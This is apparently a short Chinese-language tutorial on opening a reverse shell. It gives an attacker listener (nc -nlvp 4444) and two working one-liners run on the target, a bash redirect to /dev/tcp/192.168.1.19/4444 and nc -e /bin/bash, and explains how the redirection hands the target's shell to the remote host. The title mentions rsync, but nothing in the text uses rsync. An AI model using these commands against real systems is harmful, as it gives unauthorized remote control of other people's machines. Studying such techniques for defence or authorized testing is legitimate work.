# rsync 进行 反弹shell

攻击主机： 192.168.1.19
目标主机： 192.168.1.5

## 实现方法一：

攻击主机： 192.168.1.19
监听端口： nc -nlvp 4444

目标主机： 192.168.1.5
bash -i >& /dev/tcp/192.168.1.19/4444 0>&1

```
文件描述符
已知Linux下存在三种文件描述符：

0 - stdin 标准输入，使用< 或 <<
1 - stdout 标准输出，使用> 或 >>
2 - stderr 标准错误输出，使用2或者2>>
&>的含义
反弹shell中的&没有固定含义，放在>后面的&，表示重定向的目标不是一个文件，而是一个文件描述符。

当>&后面接文件时，表示将标准输出和标准错误输出重定向到文件
当>&后面接文件描述符时，表示将前面的文件描述符重定向到后面的文件描述符

反弹shell语句含义
bash -i表示在本地打开一个bash，/dev/tcp/VPS_IP/VPS_Port中/dev/tcp/是Linux中的一个特殊设备，打开这个文件就相当于发出了一个socket调用，建立一个socket连接，>& /dev/tcp/VPS_IP/VPS_Port表示将标准输出和标准错误输出重定向到这个文件上，即传递给远程，如果远程开启了对应端口的监听，就会接收到这个bash的标准输出和标准错误输出。

此时在本地输入命令，本地是看不到输入的内容的，因为输入设备输入的命令和输出以及错误输出的内容已经被传递到远程上。

0>&1表示将标准输入重定向到标准输出，然而此时标准输出已重定向到/dev/tcp/VPS_IP/VPS_Port这个文件，也就是远程，那么标准输入也就重定向到了远程，所以可以直接在远程输入了。

```

## 实现方法二：

攻击主机： 192.168.1.19
监听端口： nc -nlvp 4444

目标主机： 192.168.1.5
nc -e /bin/bash 192.168.1.19 4444

```
-e后面跟的参数是在创建连接后执行的程序，在连接到远程后可以在远程执行一个本地shell(/bin/bash)，也就是反弹一个shell给远程。
```


